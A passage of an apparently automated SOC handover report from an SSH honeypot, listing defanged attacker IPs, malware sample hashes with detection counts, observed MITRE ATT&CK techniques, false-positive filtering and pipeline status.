| `117.199.77[.]239` | 1 | 2026-05-13 18:43 | 2026-05-13 18:43 | 14s | 0 | `T1592` | 🟢 LOW |
| `117.50.70[.]125` | 1 | 2026-05-13 18:10 | 2026-05-13 18:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]49` | 1 | 2026-05-13 18:16 | 2026-05-13 18:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.130[.]213` | 1 | 2026-05-13 18:18 | 2026-05-13 18:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `126.38.54[.]116` | 1 | 2026-05-13 19:01 | 2026-05-13 19:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]89` | 1 | 2026-05-13 18:39 | 2026-05-13 18:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]65` | 1 | 2026-05-13 18:33 | 2026-05-13 18:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `158.174.211[.]17` | 1 | 2026-05-13 18:34 | 2026-05-13 18:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `161.132.52[.]19` | 1 | 2026-05-13 19:25 | 2026-05-13 19:26 | 35s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-05-13 18:21 | 2026-05-13 18:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `206.75.13[.]194` | 1 | 2026-05-13 18:23 | 2026-05-13 18:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.156.129[.]88` | 1 | 2026-05-13 19:49 | 2026-05-13 19:49 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.78.198[.]162` | 1 | 2026-05-13 19:08 | 2026-05-13 19:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-05-13 18:42 | 2026-05-13 18:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `68.183.178[.]130` | 1 | 2026-05-13 18:14 | 2026-05-13 18:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.111.209[.]155` | 1 | 2026-05-13 18:05 | 2026-05-13 18:07 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `68.183.178[.]130` | SG | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `112.158.200[.]53` | KR | LG POWERCOMM | **100** ⚠️ | 29 |
| `118.122.147[.]49` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `180.76.172[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `179.51.153[.]37` | BR | EUNAPOLIS TELECOM LTDA | **100** ⚠️ | 50 |
| `45.156.129[.]88` | US | INAP-CHI-1 | **100** ⚠️ | 50 |
| `206.75.13[.]194` | CA | Synergy Inmate Phone Solutions, Inc. | **100** ⚠️ | 18 |
| `45.156.129[.]86` | US | INAP-CHI-1 | **100** ⚠️ | 50 |
| `103.120.227[.]88` | CN | UNICLOUD TECH CO.,LTD. | **100** ⚠️ | 50 |
| `126.38.54[.]116` | JP | Japan Nation-wide Network of Softbank Corp. | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 21 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (125 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 53 |
| AbuseIPDB score 17 below threshold 25 | 25 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 6 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 36 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 254 cases |
| Tool 34  | Credential Extractor        | ✅ 35 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 53 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 125 filtered (49.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 45 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 31 recon entry/entries in table (10 group(s) consolidating 87 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-13T21:29:02Z_
